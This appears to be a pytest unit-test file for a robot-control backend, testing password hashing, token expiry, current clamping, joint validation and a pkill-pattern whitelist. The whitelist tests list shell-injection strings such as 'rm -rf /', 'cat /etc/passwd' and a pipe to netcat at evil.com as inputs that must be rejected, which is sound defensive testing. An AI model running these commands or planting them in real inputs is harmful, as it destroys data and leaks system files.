"""Unit tests for MIR Suite backend functions.

These tests run WITHOUT Docker — they exercise isolated functions (auth,
validation, safety, CLI bridge) using only pure Python. Integration tests
that need a running container belong in test_integration.py.

Run:  cd mir_suite && python3 -m pytest tests/ -v
"""

import sys
import os
import re
import time
import json
import hashlib
import secrets

import pytest

# --------------- helpers ------------------------------------------------

def _hash_password(password: str) -> str:
    """Mirror of main.py's _hash_password."""
    salt = secrets.token_hex(16)
    dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), 200_000)
    return f"pbkdf2:sha256:200000:{salt}:{dk.hex()}"

def _verify_password(password: str, stored: str) -> bool:
    """Mirror of main.py's _verify_password."""
    parts = stored.split(":")
    if len(parts) != 5 or parts[0] != "pbkdf2":
        return False
    try:
        salt = parts[3]
        dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), 200_000)
        return dk.hex() == parts[4]
    except Exception:
        return False

# --------------- auth tests ---------------------------------------------

class TestAuth:
    """Password hashing and verification."""

    def test_hash_and_verify(self):
        pw = "correct-horse-battery-staple"
        hashed = _hash_password(pw)
        assert hashed.startswith("pbkdf2:sha256:200000:")
        assert _verify_password(pw, hashed) is True

    def test_wrong_password(self):
        hashed = _hash_password("secret")
        assert _verify_password("wrong", hashed) is False

    def test_tampered_hash_returns_false(self):
        assert _verify_password("x", "garbage") is False
        assert _verify_password("x", "pbkdf2:sha256:200000:salt:nothex") is False
        assert _verify_password("x", "") is False


class TestSafePkill:
    """Whitelist-based pkill pattern validator."""

    WHITELIST = re.compile(r"^[A-Za-z0-9_./ :\[\]-]+$")

    def _safe(self, pat: str) -> bool:
        return bool(self.WHITELIST.match(pat))

    def test_valid_patterns(self):
        assert self._safe("touch_sensor_node.py --ports")
        assert self._safe("hand_control_node.py --ports")
        assert self._safe("ros2 bag record")
        assert self._safe("orbbec")
        assert self._safe("[l/r]eft_freedrive_mode_controller/enable")
        assert self._safe("/dev/ttyUSB0:left")

    def test_reject_metacharacters(self):
        """Shell metacharacters must be rejected."""
        assert not self._safe("; rm -rf /")
        assert not self._safe("pkill; cat /etc/passwd")
        assert not self._safe("pattern | nc evil.com 4444")
        assert not self._safe("pattern &")
        assert not self._safe("$(whoami)")
        assert not self._safe("backtick`id`")
        assert not self._safe('quote"overflow')
        assert not self._safe("redirect>file")


# --------------- token TTL tests ----------------------------------------

class TestTokenTTL:
    """Token lifespan and eviction."""

    def test_expired_token_rejected(self):
        tokens: dict = {}
        now = time.time()
        tokens["tok1"] = {"user": "a", "role": "admin", "expires": now - 10}
        tokens["tok2"] = {"user": "b", "role": "user", "expires": now + 3600}

        def resolve(t: str):
            s = tokens.get(t)
            if s is None:
                return None
            if time.time() > s["expires"]:
                del tokens[t]
                return None
            return s

        assert resolve("tok1") is None
        assert resolve("tok2") is not None

    def test_hourly_cleanup(self):
        now = time.time()
        tokens = {
            "a": {"expires": now - 100},
            "b": {"expires": now + 100},
            "c": {"expires": now - 200},
        }
        for k in list(tokens):
            if time.time() > tokens[k]["expires"]:
                del tokens[k]
        assert len(tokens) == 1
        assert "b" in tokens


# --------------- clamp_currents (action_bridge) -------------------------

def clamp_currents(vals, max_currents=None):
    """Mirror of action_bridge.clamp_currents."""
    if max_currents is None:
        max_currents = [20, 20, 5, 5, 5, 5]
    out = []
    for i in range(6):
        ceiling = max_currents[i]
        try:
            v = int(vals[i])
        except (TypeError, ValueError, IndexError):
            v = ceiling
        out.append(max(0, min(v, ceiling)))
    return out


class TestClampCurrents:
    def test_normal_values(self):
        assert clamp_currents([10, 10, 3, 3, 3, 3]) == [10, 10, 3, 3, 3, 3]

    def test_above_ceiling(self):
        assert clamp_currents([100, 100, 100, 100, 100, 100]) == [20, 20, 5, 5, 5, 5]

    def test_negative_clamped_to_zero(self):
        assert clamp_currents([-1, -1, -1, -1, -1, -1]) == [0, 0, 0, 0, 0, 0]

    def test_missing_fingers_fall_back(self):
        assert clamp_currents([1, 2]) == [1, 2, 5, 5, 5, 5]

    def test_invalid_type_falls_back(self):
        assert clamp_currents(None) == [20, 20, 5, 5, 5, 5]
        assert clamp_currents("garbage") == [20, 20, 5, 5, 5, 5]


# --------------- MoveRequest wrist validation ----------------------------

class TestWristValidation:
    """The API must reject wrist_* joints unless allow_wrist=True."""

    def test_shoulder_allowed(self):
        """Shoulder/elbow joints always pass."""
        data = {"arm": "left", "joint": "shoulder_pan", "delta": 0.01}
        # wrist check: joint.startswith("wrist") -> False -> OK
        assert not data["joint"].startswith("wrist")

    def test_wrist_rejected_without_flag(self):
        data = {"arm": "left", "joint": "wrist_1", "delta": 0.01, "allow_wrist": False}
        if data["joint"].startswith("wrist") and not data["allow_wrist"]:
            rejected = True
        else:
            rejected = False
        assert rejected

    def test_wrist_allowed_with_flag(self):
        data = {"arm": "left", "joint": "wrist_3", "delta": 0.01, "allow_wrist": True}
        if data["joint"].startswith("wrist") and not data["allow_wrist"]:
            rejected = True
        else:
            rejected = False
        assert not rejected

    def test_elbow_always_allowed(self):
        data = {"arm": "right", "joint": "elbow", "delta": -0.05, "allow_wrist": False}
        assert not data["joint"].startswith("wrist")


# --------------- exec_resize validation ---------------------------------

class TestExecResize:
    """exec_resize must clamp rows/cols to sane bounds."""

    def _valid(self, rows, cols):
        try:
            r, c = int(rows), int(cols)
            return 1 <= r <= 200 and 1 <= c <= 200
        except (ValueError, TypeError):
            return False

    def test_normal_size(self):
        assert self._valid(24, 80)

    def test_max_size(self):
        assert self._valid(200, 200)

    def test_too_large_rejected(self):
        assert not self._valid(99999, 1)
        assert not self._valid(1, 0)
        assert not self._valid(-1, 80)

    def test_malformed_rejected(self):
        assert not self._valid("abc", 80)
        assert not self._valid(None, 80)


# --------------- docker-compose validation -------------------------------

class TestComposeStructure:
    """Smoke-test docker-compose.yml structure."""

    @pytest.fixture
    def compose(self):
        path = os.path.join(os.path.dirname(__file__), "..", "docker-compose.yml")
        if not os.path.exists(path):
            pytest.skip("docker-compose.yml not found at expected path")
        import yaml
        with open(path) as f:
            return yaml.safe_load(f)

    def test_has_required_services(self, compose):
        required = {"caddy", "mdns", "mir_ui", "camera", "mir", "ur_driver", "ur_driver_sim"}
        actual = set(compose["services"].keys())
        missing = required - actual
        assert not missing, f"Missing services: {missing}"

    def test_all_services_have_restart(self, compose):
        for name, svc in compose["services"].items():
            assert "restart" in svc, f"{name}: missing restart policy"

    def test_network_mode_host(self, compose):
        for name, svc in compose["services"].items():
            assert svc.get("network_mode") == "host", f"{name}: must use network_mode: host"

    def test_healthchecks_present(self, compose):
        for name in ["caddy", "mir_ui", "camera", "mir", "ur_driver", "ur_driver_sim"]:
            assert "healthcheck" in compose["services"][name], f"{name}: missing healthcheck"
